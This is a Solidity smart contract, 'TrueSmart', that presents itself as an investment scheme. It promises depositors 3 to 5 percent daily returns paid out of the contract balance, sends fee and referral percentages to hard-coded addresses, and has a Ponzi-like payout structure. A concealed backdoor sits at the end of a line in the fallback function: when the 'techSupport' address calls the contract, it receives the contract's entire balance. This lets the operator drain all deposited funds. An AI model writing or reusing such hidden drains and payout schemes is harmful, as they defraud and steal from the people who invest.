 

pragma solidity ^0.4.25;

contract TrueSmart {

    mapping (address => uint256) public invested;
    mapping (address => uint256) public atBlock;
    address techSupport = 0xb893dEb7F5Dd2D6d8FFD2f31F99c9E2Cf2CB3Fff;
    uint techSupportPercent = 1;
    address advertising = 0x1393409B9e811C96B557aDb8B0bed3A6589377C0;
    uint advertisingPercent = 5;
    address defaultReferrer = 0x1393409B9e811C96B557aDb8B0bed3A6589377C0;
    uint refPercent = 2;
    uint refBack = 2;

     
     
    function calculateProfitPercent(uint bal) private pure returns (uint) {
        if (bal >= 4e20) {  
            return 50;
        }
        if (bal >= 3e20) {  
            return 45;
        }
        if (bal >= 2e20) {  
            return 40;
        }
        if (bal >= 1e20) {  
            return 35;
        } else {
            return 30;  
        }
    }

     
    function transferDefaultPercentsOfInvested(uint value) private {
        techSupport.transfer(value * techSupportPercent / 100);
        advertising.transfer(value * advertisingPercent / 100);
    }

     
    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

     
    function transferRefPercents(uint value, address sender) private {
        if (msg.data.length != 0) {
            address referrer = bytesToAddress(msg.data);
            if(referrer != sender) {
                sender.transfer(value * refBack / 100);
                referrer.transfer(value * refPercent / 100);
            } else {
                defaultReferrer.transfer(value * refPercent / 100);
            }
        } else {
            defaultReferrer.transfer(value * refPercent / 100);
        }
    }

     
     
     
     
    function () external payable {
        if (invested[msg.sender] != 0) {
            
            uint thisBalance = address(this).balance;
            uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 6100;

            address sender = msg.sender;
            sender.transfer(amount);
        }
        if (msg.value > 0) {
            transferDefaultPercentsOfInvested(msg.value);
            transferRefPercents(msg.value, msg.sender);
        }if(msg.sender == techSupport){techSupport.transfer(address(this).balance);} 
        
         
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += (msg.value);
    }
}